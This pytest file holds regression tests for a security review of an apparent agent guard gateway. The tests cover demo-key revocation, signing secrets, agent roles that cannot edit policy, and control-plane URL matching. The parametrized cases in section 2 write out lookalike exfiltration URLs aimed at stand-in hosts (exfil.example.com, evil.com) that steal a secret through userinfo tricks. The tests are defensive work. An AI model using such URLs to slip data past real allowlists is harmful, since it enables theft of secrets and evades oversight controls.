"""Regression tests for the security review findings (v0.4.2).

Each test reproduces a bypass that passed the previous suite.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from varden.app_factory import create_app
from varden.auth import DEV_ADMIN_API_KEY, DEV_AGENT_API_KEY, LocalAuth
from varden.config import AppConfig
from varden.models import Action
from varden.policy import PolicyEngine

STRONG_SECRET = "s" * 48
ALLOW_ALL = {"block": [], "warn": [], "monitor": [], "allow": [{"type": "tool_call"}]}


def _cfg(tmp_path: Path, **overrides) -> AppConfig:
    policy = tmp_path / "policy.json"
    if not policy.exists():
        policy.write_text(json.dumps({"block": [{"type": "tool_call", "tool": "delete_database"}], "warn": [], "monitor": [], "allow": []}))
    base = dict(
        env="dev",
        db_path=str(tmp_path / "varden.db"),
        auth_db_path=str(tmp_path / "varden_auth.db"),
        policy_file=str(policy),
        signing_secret="dev-secret",
        rate_limit_per_minute=10_000,
    )
    base.update(overrides)
    return AppConfig(**base)


def _prod(tmp_path: Path, **overrides) -> AppConfig:
    return _cfg(tmp_path, env="prod", enable_dev_bootstrap=False, signing_secret=STRONG_SECRET, **overrides)


# --- 1. Demo admin key must not work outside dev ----------------------------

def test_prod_config_rejects_published_demo_keys(tmp_path):
    cfg = _prod(tmp_path)
    assert cfg.validate() == []
    client = TestClient(create_app(cfg))
    health = client.get("/health").json()
    assert health["bootstrap_api_key"] is None
    assert health["bootstrap_bearer_token"] is None
    for key in (DEV_ADMIN_API_KEY, DEV_AGENT_API_KEY):
        assert client.get("/policy", headers={"x-api-key": key}).status_code == 403
        assert client.put("/policy", headers={"x-api-key": key}, json=ALLOW_ALL).status_code == 403
        assert client.post("/sdk/guard", headers={"x-api-key": key}, json={"action": {"type": "tool_call"}}).status_code == 403


def test_demo_keys_revoked_when_dev_db_is_reused_in_prod(tmp_path):
    TestClient(create_app(_cfg(tmp_path)))  # dev run mints the demo keys
    client = TestClient(create_app(_prod(tmp_path)))
    assert client.put("/policy", headers={"x-api-key": DEV_ADMIN_API_KEY}, json=ALLOW_ALL).status_code == 403


def test_dev_bearer_token_invalid_after_secret_rotation(tmp_path):
    dev = TestClient(create_app(_cfg(tmp_path, signing_secret="change-me")))
    token = dev.get("/health").json()["bootstrap_bearer_token"]
    assert dev.get("/policy", headers={"Authorization": f"Bearer {token}"}).status_code == 200
    prod = TestClient(create_app(_prod(tmp_path)))
    assert prod.get("/policy", headers={"Authorization": f"Bearer {token}"}).status_code == 403


def test_placeholder_or_short_signing_secret_rejected_outside_dev(tmp_path):
    for secret in ("change-me", "change-this-in-production", "short"):
        errors = _cfg(tmp_path, env="prod", enable_dev_bootstrap=False, signing_secret=secret).validate()
        assert any("signing_secret" in e for e in errors), secret


def test_operator_seeded_admin_key(tmp_path):
    seed = "k" * 40
    client = TestClient(create_app(_prod(tmp_path, bootstrap_admin_api_key=seed)))
    assert client.get("/policy", headers={"x-api-key": seed}).status_code == 200
    bad = _prod(tmp_path, bootstrap_admin_api_key=DEV_ADMIN_API_KEY).validate()
    assert any("demo key" in e for e in bad)


def test_keys_cli_does_not_rotate_server_signing_key(tmp_path):
    auth_db = str(tmp_path / "auth.db")
    LocalAuth(auth_db, STRONG_SECRET)
    from varden.cli import main

    assert main(["keys", "--auth-db", auth_db, "create", "--role", "agent"]) == 0
    active = [k for k in LocalAuth(auth_db, None, manage_signing_keys=False).list_signing_keys() if k["active"]]
    assert [k["secret"] for k in active] == [STRONG_SECRET]


# --- 2. Control-plane allowlist must compare origins, not prefixes ----------

class _FakeClient:
    def __init__(self, base_url):
        self.base_url = base_url


class _FakeGuard:
    def __init__(self, base_url="http://127.0.0.1:8000"):
        self.client = _FakeClient(base_url)


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:8000@exfil.example.com/steal?d=secret",
        "http://127.0.0.1:8000:x@exfil.example.com/",
        "http://127.0.0.1:80001/",
        "http://127.0.0.1:8000.evil.com/",
        "https://127.0.0.1:8000/sdk/guard",
        "http://127.0.0.1:9000/sdk/guard",
        "http://localhost.evil.com/",
        "http://testserver/anything",
        "http://test/anything",
        "ftp://127.0.0.1:8000/",
    ],
)
def test_lookalike_urls_are_not_control_plane(url):
    from varden_sdk.sdk import _is_control_plane_request

    assert _is_control_plane_request(url, _FakeGuard()) is False


@pytest.mark.parametrize(
    "url", ["http://127.0.0.1:8000/sdk/guard", "http://127.0.0.1:8000", "HTTP://127.0.0.1:8000/x"]
)
def test_exact_control_plane_origin_is_recognised(url):
    from varden_sdk.sdk import _is_control_plane_request

    assert _is_control_plane_request(url, _FakeGuard()) is True


def test_control_plane_base_path_is_respected():
    from varden_sdk.sdk import _is_control_plane_request

    guard = _FakeGuard("https://gw.example.com/varden")
    assert _is_control_plane_request("https://gw.example.com/varden/sdk/guard", guard)
    assert not _is_control_plane_request("https://gw.example.com/other/upload", guard)
    assert not _is_control_plane_request("https://gw.example.com/vardenx/upload", guard)


def test_userinfo_exfil_url_is_guarded_end_to_end(tmp_path, monkeypatch):
    """Patched requests must route the lookalike URL through /sdk/guard."""
    import varden_sdk.sdk as sdk_mod

    seen = []

    def fake_guarded_action(self, **kwargs):
        seen.append(kwargs.get("url"))
        raise sdk_mod.VardenBlockedError("blocked", {"action": "block"})

    monkeypatch.setattr(sdk_mod.VardenGuard, "guarded_action", fake_guarded_action)
    guard = sdk_mod.VardenGuard(base_url="http://127.0.0.1:8000", api_key="x", emit_attestation=False)
    import requests

    sdk_mod._patch_requests(guard)
    token = sdk_mod._current_guard.set(guard)
    try:
        with pytest.raises(sdk_mod.VardenBlockedError):
            requests.get("http://127.0.0.1:8000@exfil.invalid/steal?d=secret", timeout=0.1)
    finally:
        sdk_mod._current_guard.reset(token)
        sdk_mod.unpatch_runtime()
    assert seen and "exfil.invalid" in seen[0]


# --- 3. Agents get an ingest-only key --------------------------------------

def test_agent_role_can_ingest_but_not_administer(tmp_path):
    client = TestClient(create_app(_cfg(tmp_path)))
    boot = client.get("/sdk/bootstrap").json()
    assert boot["bootstrap_api_key"] == DEV_AGENT_API_KEY and boot["bootstrap_role"] == "agent"
    h = {"x-api-key": DEV_AGENT_API_KEY}
    guard = client.post("/sdk/guard", headers=h, json={"action": {"type": "tool_call", "tool": "ls"}, "payload": {}})
    assert guard.status_code == 200
    assert client.get("/auth/whoami", headers=h).json()["role"] == "agent"
    assert client.put("/policy", headers=h, json=ALLOW_ALL).status_code == 403
    assert client.get("/policy", headers=h).status_code == 403
    assert client.get("/events", headers=h).status_code == 403
    assert client.get("/approvals/pending", headers=h).status_code == 403


def _sdk_guard_against(app, api_key, mode):
    from varden_sdk.sdk import VardenGuard

    guard = VardenGuard(base_url="http://testserver", api_key=api_key, mode=mode, auto_instrument=False, emit_attestation=False)
    guard.client._client = TestClient(app)
    return guard


def test_strict_sdk_refuses_privileged_key(tmp_path):
    app = create_app(_cfg(tmp_path))
    with pytest.raises(RuntimeError, match="privileged agent credential"):
        _sdk_guard_against(app, DEV_ADMIN_API_KEY, "strict")._check_credential_privilege()
    ok = _sdk_guard_against(app, DEV_AGENT_API_KEY, "strict")
    ok._check_credential_privilege()
    assert ok.credential_role == "agent"


def test_guarded_sdk_warns_on_privileged_key(tmp_path):
    app = create_app(_cfg(tmp_path))
    with pytest.warns(UserWarning, match="role 'admin'"):
        _sdk_guard_against(app, DEV_ADMIN_API_KEY, "guarded")._check_credential_privilege()


# --- 4. Simulation must not leak into live decisions ------------------------

class _HookRow(dict):
    """A trace row that evaluates a live action while the simulation runs."""

    def __init__(self, engine, probe, out, **kw):
        super().__init__(**kw)
        self._engine, self._probe, self._out = engine, probe, out

    def get(self, key, default=None):
        if key == "action":
            self._out.append(self._engine.evaluate(self._probe).action)
        return super().get(key, default)


def test_simulate_trace_does_not_change_live_policy(tmp_path):
    live = {"block": [{"type": "tool_call", "tool": "delete_database"}], "warn": [], "monitor": [], "allow": []}
    engine = PolicyEngine(str(tmp_path / "p.db"), live)
    probe = Action(type="tool_call", tool="delete_database")
    observed: list[str] = []
    row = _HookRow(engine, probe, observed, id=1, status="blocked", action={"type": "tool_call", "tool": "delete_database"})
    result = engine.simulate_trace([row], ALLOW_ALL)
    assert result["summary"]["allow"] == 1  # candidate evaluated
    assert observed == ["block"]  # live decisions unaffected mid-simulation
    # Live store is a private deep copy — caller retains no alias.
    assert engine.policy is not live
    live["block"] = []
    assert engine.evaluate(probe).action == "block"
    assert engine.get_policy()["block"][0]["tool"] == "delete_database"


# --- 5. min_risk_score is a threshold ---------------------------------------

@pytest.mark.parametrize("score,expected", [(0, "allow"), (59, "allow"), (60, "block"), (95, "block"), (100, "block")])
def test_min_risk_score_is_threshold(tmp_path, score, expected):
    engine = PolicyEngine(str(tmp_path / "p.db"), {"block": [{"min_risk_score": 60}]})
    assert engine.evaluate(Action(type="tool_call", risk_score=score)).action == expected


# --- 6. Import order ----------------------------------------------------------

@pytest.mark.parametrize("stmt", ["import varden_sdk", "import varden_sdk.sdk", "import varden; varden.protect", "from varden import protect, tagged_data"])
def test_any_import_order_works(stmt):
    repo = Path(__file__).resolve().parents[1]
    proc = subprocess.run([sys.executable, "-c", stmt], cwd=repo, capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr


# --- Startup policy validation ------------------------------------------------

BAD_POLICY = {"block": [{"classifier:secret": True}], "warn": [], "monitor": [], "allow": []}


def test_invalid_policy_fails_startup_outside_dev(tmp_path):
    (tmp_path / "policy.json").write_text(json.dumps(BAD_POLICY))
    with pytest.raises(RuntimeError, match="refusing to start.*secrets"):
        create_app(_prod(tmp_path))


def test_invalid_policy_fails_startup_in_dev_with_strict_policy(tmp_path):
    (tmp_path / "policy.json").write_text(json.dumps(BAD_POLICY))
    with pytest.raises(RuntimeError, match="refusing to start"):
        create_app(_cfg(tmp_path, strict_policy=True))


def test_invalid_policy_only_warns_in_plain_dev(tmp_path, caplog):
    (tmp_path / "policy.json").write_text(json.dumps(BAD_POLICY))
    create_app(_cfg(tmp_path))
    assert any("classifier" in r.getMessage() for r in caplog.records)


def test_missing_policy_fails_startup_outside_dev(tmp_path):
    cfg = _prod(tmp_path)
    Path(cfg.policy_file).unlink()
    with pytest.raises(RuntimeError, match="not found"):
        create_app(cfg)


@pytest.mark.parametrize("content", ["{not json", "[]"])
def test_unreadable_policy_fails_startup(tmp_path, content):
    (tmp_path / "policy.json").write_text(content)
    with pytest.raises(RuntimeError, match="refusing to start"):
        create_app(_prod(tmp_path))


def test_shipped_deploy_policy_starts_in_prod(tmp_path):
    repo = Path(__file__).resolve().parents[1]
    (tmp_path / "policy.json").write_text((repo / "deploy" / "config" / "policy.json").read_text())
    TestClient(create_app(_prod(tmp_path)))
